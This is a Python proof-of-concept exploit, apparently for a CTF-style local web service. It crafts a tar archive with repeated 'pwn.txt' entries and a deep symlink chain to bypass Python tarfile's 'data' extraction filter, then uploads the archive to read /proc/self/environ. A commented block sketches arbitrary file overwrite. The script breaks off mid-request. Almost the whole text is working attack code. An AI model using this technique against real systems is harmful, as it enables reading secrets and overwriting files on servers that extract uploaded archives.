import requests
import tarfile
from io import BytesIO

url = 'http://localhost:8000/'

def arb_read(target: str = 'proc/self/environ'):
    with tarfile.open('poc.tar.gz', 'w:gz') as tar:
        def addmemb(name, **kwargs):
            memb = tarfile.TarInfo(name)
            for k, v in kwargs.items():
                getattr(memb, k)
                setattr(memb, k, v)
            tar.addfile(memb)

        # lrw-r--r-- pwn -> .
        addmemb('pwn.txt', type=tarfile.SYMTYPE, linkname='.')
        # "pwn" is a very innocent symlink.

        # drwxrwxrwx pwn/
        addmemb('pwn.txt', type=tarfile.DIRTYPE, mode=0o777)
        # But now "pwn" is also a directory, so it's scheduled to have its
        # metadata updated later.

        # lrw-r--r-- pwn -> x/x/x/x/⋯⋯⋯/x/../../../../⋯⋯⋯/../TARGET
        addmemb('pwn.txt', type=tarfile.SYMTYPE, linkname=('x/' * 99 + '../' * 99 + target))
        # Oops, "pwn" is not so innocent any more.
        # But technically it's still pointing inside the dest dir,
        # so it doesn't upset the "data" filter.
        
        # now overwrite the file itself
        # contents = b"overwritten data\n"
        # contents = BytesIO(contents)
        # ti = tarfile.TarInfo(name='wtf.txt')
        # ti.size = len(contents.getbuffer())
        # ti.path = 'pwn.txt/' + overwrite_file
        # tar.addfile(ti, contents)

        # lrw-r--r-- x/x/x/x/⋯⋯⋯/x -> ../../../⋯⋯⋯/..
        addmemb(('x/' * 99), type=tarfile.SYMTYPE, linkname=('../' * 98))
        # The newly created symlink symlink points to the dest dir,
        # so it's OK for the "data" filter.
        # But now "pwn" points to the target (outside the dest dir).

    r = requests.post(url + 'api/file/encrypt', files={'file': open('poc.tar.gz', 'rb')})
    enc = r.json()['data']['pwn.txt']
    r = requests.post(url + 'api/file/decrypt', json={'ciphertext': enc